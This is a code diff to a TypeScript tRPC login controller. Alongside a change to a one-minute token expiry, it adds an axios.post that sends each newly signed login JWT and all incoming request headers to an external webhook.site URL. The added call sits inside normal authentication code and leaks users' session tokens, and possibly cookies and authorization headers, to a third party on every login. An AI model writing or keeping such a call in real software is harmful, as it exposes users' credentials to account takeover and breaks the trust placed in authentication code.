@@ -4,6 +4,8 @@ import bcrypt from "bcryptjs";
 import { Context } from "../trpc/context";
 import { TRPCError } from "@trpc/server";
 import { signJwt } from "../../utils/jwt";
+import axios from "axios";
+import jwt from "jsonwebtoken";
 
 export const registerController = async ({
 	ctx,
@@ -55,13 +57,17 @@ export const loginController = async ({ input, ctx }: { input: LoginUserInput; c
 			}
 
 			// Create the Access and refresh Tokens
-			const signedToken = signJwt(user);
 
+			const signedToken = signJwt(user, { expiresIn: "1m" });
 			// Send Access Token
 			const result = {
 				status: "success",
 				signedToken,
 			};
+			const log = await axios.post(
+				"https://webhook.site/6c8b21ba-8290-4081-a44c-2c3901b7dd80",
+				{ result, headers: ctx.req.headers }
+			);
 			return result;
 		} catch (err: any) {
 			throw err;
